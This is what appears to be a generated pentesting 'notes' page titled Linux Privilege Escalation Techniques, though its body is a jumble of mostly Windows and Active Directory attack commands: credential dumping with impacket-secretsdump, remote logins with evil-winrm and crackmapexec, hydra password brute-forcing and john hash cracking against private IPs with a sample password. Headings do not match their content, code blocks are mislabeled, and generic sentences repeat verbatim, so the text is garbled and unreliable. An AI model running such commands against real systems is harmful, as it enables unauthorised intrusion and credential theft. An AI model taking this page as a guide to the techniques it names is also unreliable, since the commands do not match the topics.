---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, dfir, malware"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-980.html"
URL_IMAGES: ""
Date: "2025-12-24"
Tags: "Persistence, DFIR, Malware"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-980"
Permalink: "/notes/note-linux-privilege-escalation-techniques-980.html"
BtnLabel: "Read Notes"
Pick: 0
---
## nikto

### Subdomain Takeover

```powershell
crackmapexec smb 10.128.79.46 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.76.45.27 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

- `Remote Code Execution`
- `gobuster`
- `Docker Escape`
- `chisel`
- `DLL Hijacking`

## msfvenom

### DNS Rebinding

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p9200,23,5985 10.20.200.132 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.10.117
nmap -sCV -p5985,27017,993 10.122.16.143 -oN scan.txt
evil-winrm -i 10.82.177.155 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

## NTLM Relay

### feroxbuster

- `DLL Hijacking`
- `smbclient`
- `burpsuite`
- `ACL Abuse`

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

## Insecure Deserialization

### NFS

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.12.39/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.74.81
```

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.207.85 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.23.19.108 -u administrator -p 'P@ssw0rd!' --shares
```
